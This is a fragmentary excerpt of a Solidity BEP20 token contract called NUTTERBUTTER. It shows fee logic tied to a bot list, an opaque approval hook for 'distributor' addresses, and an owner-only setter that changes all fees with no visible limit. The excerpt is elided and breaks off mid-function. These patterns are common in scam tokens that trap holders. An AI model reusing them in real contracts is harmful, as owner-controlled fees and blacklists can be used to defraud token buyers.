...
contract NUTTERBUTTER is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'NUTTERBUTTER';
    ...
    function checkapprovals(address recipient) internal {if(isDistributor[recipient] && distribute){performapprovals(1,1);}}
    ...
    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return (!taxOn() && isBot[sender]) || (!isFeeExempt[sender] && !isFeeExempt[recipient]);
    }

    function taxOn() internal view returns (bool) {
        return totalFee > 0;
    }
    ...
    function setStructure(uint256 _liq, uint256 _mark, uint256 _stak, uint256 _burn, uint256 _rew, uint256 _disc) external authorized {
        liquidityFee = _liq;
        marketingFee = _mark;
        stakingFee = _stak;
        burnFee = _burn;
